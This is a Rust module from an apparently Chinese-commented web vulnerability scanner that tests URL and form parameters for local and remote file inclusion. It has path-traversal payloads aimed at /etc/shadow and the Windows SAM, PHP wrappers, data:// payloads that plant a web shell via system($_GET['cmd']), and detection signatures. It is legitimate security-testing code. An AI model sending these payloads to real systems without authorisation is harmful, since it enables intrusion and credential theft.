//! G5.3 文件包含（LFI/RFI）检测
//!
//! 通过注入路径遍历、PHP 伪协议、远程 URL 等 payload 检测 LFI/RFI 漏洞。
//! 命中依据：响应体出现系统敏感文件特征（`root:`、`[extensions]`、`DBPATH` 等）
//! 或包含 PHP 伪协议解析的 base64 内容。

use crate::types::{FormData, HttpResponse, VulnCategory, VulnFinding, Severity};
use std::time::Duration;

/// G5.3 文件包含扫描器
pub struct FileInclusionScanner {
    http: reqwest::Client,
}

impl FileInclusionScanner {
    pub fn new() -> Self {
        let http = reqwest::Client::builder()
            .timeout(Duration::from_secs(30))
            .redirect(reqwest::redirect::Policy::none())
            .user_agent("Argus-WebScanner/0.1")
            .build()
            .expect("构建 HTTP 客户端失败");
        Self { http }
    }

    /// 扫描 URL 查询参数的 LFI/RFI
    pub async fn scan_url(&self, url: &str, param: &str) -> Vec<VulnFinding> {
        let mut findings = Vec::new();
        for payload in LFI_PAYLOADS {
            let test_url = inject_param(url, param, payload);
            if let Some(resp) = self.fetch_get(&test_url).await {
                if let Some(finding) = self.analyze_lfi(&resp, payload, &test_url, param) {
                    findings.push(finding);
                }
            }
        }
        for payload in RFI_PAYLOADS {
            let test_url = inject_param(url, param, payload);
            if let Some(resp) = self.fetch_get(&test_url).await {
                if let Some(finding) = self.analyze_rfi(&resp, payload, &test_url, param) {
                    findings.push(finding);
                }
            }
        }
        dedup_findings(findings)
    }

    /// 扫描表单字段的 LFI/RFI
    pub async fn scan_form(&self, form: &FormData, field_name: &str) -> Vec<VulnFinding> {
        let mut findings = Vec::new();
        for payload in LFI_PAYLOADS {
            if let Ok(resp) = self.send_form_payload(form, field_name, payload).await {
                if let Some(finding) = self.analyze_lfi(&resp, payload, &form.action, field_name) {
                    findings.push(finding);
                }
            }
        }
        for payload in RFI_PAYLOADS {
            if let Ok(resp) = self.send_form_payload(form, field_name, payload).await {
                if let Some(finding) = self.analyze_rfi(&resp, payload, &form.action, field_name) {
                    findings.push(finding);
                }
            }
        }
        dedup_findings(findings)
    }

    /// LFI 响应分析：检查敏感文件特征
    fn analyze_lfi(
        &self,
        resp: &HttpResponse,
        payload: &str,
        url: &str,
        param: &str,
    ) -> Option<VulnFinding> {
        for indicator in LFI_INDICATORS {
            if resp.body.contains(indicator) {
                return Some(VulnFinding {
                    category: VulnCategory::PathTraversal,
                    url: url.to_string(),
                    parameter: Some(param.to_string()),
                    payload: Some(payload.to_string()),
                    evidence: format!("LFI 命中敏感文件特征: {}", indicator),
                    severity: Severity::Critical,
                });
            }
        }
        // PHP filter base64 内容特征
        if payload.contains("php://filter") && resp.body.len() >= 16 {
            // base64 解码后通常为可读字符
            if resp
                .body
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '=' || c == '+' || c == '/')
                && resp.body.len() % 4 == 0
            {
                return Some(VulnFinding {
                    category: VulnCategory::PathTraversal,
                    url: url.to_string(),
                    parameter: Some(param.to_string()),
                    payload: Some(payload.to_string()),
                    evidence: "php://filter base64 内容泄漏".to_string(),
                    severity: Severity::High,
                });
            }
        }
        None
    }

    /// RFI 响应分析：远程文件被成功加载
    fn analyze_rfi(
        &self,
        resp: &HttpResponse,
        payload: &str,
        url: &str,
        param: &str,
    ) -> Option<VulnFinding> {
        // 远程响应成功加载，且响应体长度大于阈值且与 payload URL 关联
        if resp.status == 200 && resp.body.len() > 50 {
            for marker in RFI_SUCCESS_MARKERS {
                if resp.body.contains(marker) {
                    return Some(VulnFinding {
                        category: VulnCategory::PathTraversal,
                        url: url.to_string(),
                        parameter: Some(param.to_string()),
                        payload: Some(payload.to_string()),
                        evidence: format!("RFI 命中远程文件特征: {}", marker),
                        severity: Severity::Critical,
                    });
                }
            }
        }
        None
    }

    async fn fetch_get(&self, url: &str) -> Option<HttpResponse> {
        let resp = self.http.get(url).send().await.ok()?;
        Some(http_response_from(resp).await)
    }

    async fn send_form_payload(
        &self,
        form: &FormData,
        field_name: &str,
        payload: &str,
    ) -> Result<HttpResponse, String> {
        let mut params = Vec::new();
        for f in &form.fields {
            let val = if f.name == field_name {
                payload.to_string()
            } else {
                f.value.clone()
            };
            params.push((f.name.clone(), val));
        }
        let resp = if form.method.eq_ignore_ascii_case("POST") {
            self.http.post(&form.action).form(&params).send().await
        } else {
            let query: String = params
                .iter()
                .map(|(k, v)| format!("{}={}", k, v))
                .collect::<Vec<_>>()
                .join("&");
            let url = if form.action.contains('?') {
                format!("{}&{}", form.action, query)
            } else {
                format!("{}?{}", form.action, query)
            };
            self.http.get(&url).send().await
        };
        let resp = resp.map_err(|e| e.to_string())?;
        Ok(http_response_from(resp).await)
    }
}

impl Default for FileInclusionScanner {
    fn default() -> Self {
        Self::new()
    }
}

/// LFI payload：相对路径、绝对路径、URL 编码、PHP 伪协议
const LFI_PAYLOADS: &[&str] = &[
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/status",
    "/var/log/auth.log",
    "/var/log/apache2/access.log",
    "/var/log/httpd/access_log",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\windows\\system32\\config\\SAM",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\system32\\drivers\\etc\\hosts",
    "C:\\boot.ini",
    "php://filter/convert.base64/resource=/etc/passwd",
    "php://filter/convert.base64/resource=index.php",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "php://filter/read=string.rot13/resource=/etc/passwd",
    "file:///etc/passwd",
    "file://C:/Windows/win.ini",
];

/// RFI payload：远程 URL（要求 allow_url_include=On）
const RFI_PAYLOADS: &[&str] = &[
    "http://localhost/",
    "http://127.0.0.1/",
    "http://localhost/etc/passwd",
    "https://localhost/",
    "http://localhost:80/",
    "http://localhost/index.html",
    "ftp://localhost/",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7",
    "data://text/plain,<?php system($_GET['cmd']);?>",
    "expect://id",
];

/// LFI 命中特征：敏感文件内容关键字
const LFI_INDICATORS: &[&str] = &[
    "root:x:0:0",
    "root:0:0:",
    "daemon:",
    "nobody:",
    "bin:x:",
    "[extensions]",
    "[fonts]",
    "[files]",
    "DBPATH=",
    "MAPI=1",
    "[boot loader]",
    "boot.ini",
    "[operating systems]",
    "multi(0)disk(0)rdisk(0)",
    "default=",
    "/bin/bash",
    "/bin/sh",
    "/sbin/nologin",
    "HubName",
    "INIT63",
];

/// RFI 命中特征：本地响应中包含的远程加载成功标记
const RFI_SUCCESS_MARKERS: &[&str] = &[
    "It works!",
    "Apache2 Debian Default Page",
    "Apache2 Ubuntu Default Page",
    "Test Page for the HTTP Server",
    "Apache HTTP Server Test Page",
    "Default Web Site Page",
    "IIS Windows",
    "Welcome to nginx",
    "<title>localhost",
];

/// 通用：从 reqwest::Response 提取 HttpResponse
async fn http_response_from(resp: reqwest::Response) -> HttpResponse {
    let status = resp.status().as_u16();
    let headers: Vec<(String, String)> = resp
        .headers()
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
        .collect();
    let body = resp.text().await.unwrap_or_default();
    HttpResponse { status, headers, body }
}

/// 向 URL 的查询参数注入 payload
fn inject_param(url: &str, param: &str, payload: &str) -> String {
    let parsed = match url::Url::parse(url) {
        Ok(u) => u,
        Err(_) => return url.to_string(),
    };
    let mut new_url = parsed.clone();
    new_url.query_pairs_mut().clear().append_pair(param, payload);
    new_url.to_string()
}

/// 简单去重：相同 (url, payload) 只保留一条
fn dedup_findings(mut findings: Vec<VulnFinding>) -> Vec<VulnFinding> {
    let mut seen = std::collections::HashSet::new();
    findings.retain(|f| {
        let key = (f.url.clone(), f.payload.clone());
        seen.insert(key)
    });
    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_lfi_payloads_nonempty() {
        assert!(!LFI_PAYLOADS.is_empty());
        assert!(LFI_PAYLOADS.iter().any(|p| p.contains("etc/passwd")));
        assert!(LFI_PAYLOADS.iter().any(|p| p.contains("win.ini")));
        assert!(LFI_PAYLOADS.iter().any(|p| p.contains("php://filter")));
    }

    #[test]
    fn test_rfi_payloads_nonempty() {
        assert!(!RFI_PAYLOADS.is_empty());
        assert!(RFI_PAYLOADS.iter().any(|p| p.starts_with("http://localhost")));
        assert!(RFI_PAYLOADS.iter().any(|p| p.starts_with("data:")));
    }

    #[test]
    fn test_lfi_indicators_nonempty() {
        assert!(!LFI_INDICATORS.is_empty());
        assert!(LFI_INDICATORS.contains(&"root:x:0:0"));
        assert!(LFI_INDICATORS.contains(&"[extensions]"));
    }

    #[test]
    fn test_inject_param_lfi() {
        let url = "https://example.com/page?file=test.txt";
        let result = inject_param(url, "file", "../../../etc/passwd");
        assert!(result.contains("file="));
    }

    #[test]
    fn test_analyze_lfi_passwd_hit() {
        let scanner = FileInclusionScanner::new();
        let resp = HttpResponse {
            status: 200,
            headers: vec![],
            body: "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin".to_string(),
        };
        let finding = scanner.analyze_lfi(&resp, "../../../etc/passwd", "https://example.com", "file");
        assert!(finding.is_some());
        let f = finding.unwrap();
        assert_eq!(f.category, VulnCategory::PathTraversal);
        assert_eq!(f.severity, Severity::Critical);
        assert!(f.evidence.contains("LFI"));
    }

    #[test]
    fn test_analyze_lfi_winini_hit() {
        let scanner = FileInclusionScanner::new();
        let resp = HttpResponse {
            status: 200,
            headers: vec![],
            body: "[extensions]\n[fonts]\n[files]\nMAPI=1".to_string(),
        };
        let finding = scanner.analyze_lfi(&resp, "..\\..\\..\\windows\\win.ini", "https://example.com", "file");
        assert!(finding.is_some());
    }

    #[test]
    fn test_analyze_lfi_php_filter() {
        let scanner = FileInclusionScanner::new();
        let resp = HttpResponse {
            status: 200,
            headers: vec![],
            // 100 字符的合法 base64 串
            body: "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4KPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4K".to_string(),
        };
        let finding = scanner.analyze_lfi(
            &resp,
            "php://filter/convert.base64/resource=/etc/passwd",
            "https://example.com",
            "file",
        );
        assert!(finding.is_some());
        assert!(finding.unwrap().evidence.contains("php://filter"));
    }

    #[test]
    fn test_analyze_lfi_negative() {
        let scanner = FileInclusionScanner::new();
        let resp = HttpResponse {
            status: 200,
            headers: vec![],
            body: "<html><body>Page not found</body></html>".to_string(),
        };
        let finding = scanner.analyze_lfi(&resp, "../../../etc/passwd", "https://example.com", "file");
        assert!(finding.is_none());
    }

    #[test]
    fn test_analyze_rfi_hit() {
        let scanner = FileInclusionScanner::new();
        let resp = HttpResponse {
            status: 200,
            headers: vec![],
            body: "<html><head><title>localhost</title></head><body>It works!</body></html>".to_string(),
        };
        let finding = scanner.analyze_rfi(&resp, "http://localhost/", "https://example.com", "url");
        assert!(finding.is_some());
        assert_eq!(finding.unwrap().severity, Severity::Critical);
    }

    #[test]
    fn test_analyze_rfi_negative() {
        let scanner = FileInclusionScanner::new();
        let resp = HttpResponse {
            status: 404,
            headers: vec![],
            body: "Not found".to_string(),
        };
        let finding = scanner.analyze_rfi(&resp, "http://localhost/", "https://example.com", "url");
        assert!(finding.is_none());
    }

    #[test]
    fn test_dedup() {
        let f = VulnFinding {
            category: VulnCategory::PathTraversal,
            url: "https://example.com".to_string(),
            parameter: Some("file".to_string()),
            payload: Some("../../../etc/passwd".to_string()),
            evidence: "test".to_string(),
            severity: Severity::Critical,
        };
        let findings = vec![f.clone(), f];
        assert_eq!(dedup_findings(findings).len(), 1);
    }
}
